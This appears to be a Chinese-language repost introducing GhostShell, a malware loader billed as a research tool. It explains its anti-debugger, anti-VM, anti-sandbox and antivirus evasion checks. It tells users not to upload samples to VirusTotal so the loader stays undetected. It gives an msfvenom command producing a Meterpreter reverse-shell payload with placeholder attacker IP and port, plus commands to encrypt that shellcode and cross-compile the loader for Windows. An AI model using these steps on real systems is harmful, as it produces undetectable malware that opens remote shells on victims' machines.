******GhostShell是一款专为恶意软件研究人员设计的工具，首先它是无法被检测到的，自带有反病毒产品绕过技术，并且无法进行反汇编分析。同时在这个恶意软件中，它还使用了某些技术来绕过反病毒产品、虚拟机和沙箱环境。**
****![Malware.jpg](https://image.3001.net/images/20200604/1591252876_5ed8978c20d8f.jpg!small)
****注意事项****

为了保证反病毒产品无法检测到GhostShell，请不要将生成的样本发送至VirusTotal。如果想要检测GhostShell，可以将其发送至[
_https://www.hybrid-analysis.com/_](https://www.hybrid-analysis.com/)，别忘了勾选“Do
not send my sample to non-affiliated third parties”选项（不要将我的样本发送给第三方厂商）。

## 工具下载

广大研究人员可以使用下列命令将该项目源码克隆至本地，然后进行代码编译：

    
    
    git clone https://github.com/ReddyyZ/GhostShell.git

## 绕过技术

### 反调试器

为了尝试绕过调试器的分析，GhostShell在这里使用了`Windows.h`库中的`IsDebuggerPresent()`方法来判断当前是否有代码调试器正在运行。

### 反虚拟机/反沙箱环境/反AV

1、 进程枚举功能

GhostShell可以枚举出当前操作系统中所有正在运行的进程，然后将进程列表与黑名单中的进程名称进行对比，如果找到了匹配的进程，则返回识别标识符“-1”。

2、 休眠加速检测功能

首先，GhostShell会尝试获取当前时间，然后休眠两分钟。接下来，并再次尝试获取时间，然后进行对比。如果时间差小于2，则返回识别标识符“-1”。

3、 MAC地址检测功能

获取系统MAC地址，并与黑名单中的MAC地址进行比对，如果检测到了匹配项，则返回识别标识符“-1”。

## 生成ShellCode

如需生成ShellCode，你需要在命令行终端窗口中输入下列命令：

    
    
    msfvenom -p windows/meterpreter/reverse_shell lhost=(IP) lport=(PORT) -f c

接下来，你需要拷贝生成的ShellCode，然后对其进行加密处理。

在加密时，你需要使用`encrypt_shellcode`脚本。

在Linux平台上，请运行下列命令：

    
    
    ./encrypt_shellcode e "(KEY, ex: "\xda\xe6\x1d\x5c\x9v\x8d") "(shellcode)""

在Windows平台上，请运行下列命令：

    
    
    encrypt_shellcode.exe e "(KEY, ex: "\xda\xe6\x1d\x5c\x9v\x8d") "(YOUR_SHELLCODE)""

## 如何在Linux编译Windows端恶意软件

如果你需要在Linux系统中编译适用于Windows平台的GhostShell程序，首先你需要运行下列命令安装mingw-w64：

    
    
    sudo apt-get install mingw-w64

接下来，运行下列命令编译32位代码：

    
    
    i686-w64-mingw32-gcc -o main.exe main.c -l psapi –static

或者，你也可以运行下列命令编译64位源码：

    
    
    x86_64-w64-mingw32 -o main.exe main.c -l psapi -static

## 许可证协议

> GhostShell项目的开发与发布遵循[
> _MIT开源许可证协议_](https://github.com/ReddyyZ/GhostShell/blob/master/LICENSE.md)

## 项目地址

> GhostShell：【[ _GitHub_ _传送门_](https://github.com/ReddyyZ/GhostShell)】

##  **参考来源**

> **[ReddyyZ](https://github.com/ReddyyZ/GhostShell)**

 ***FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

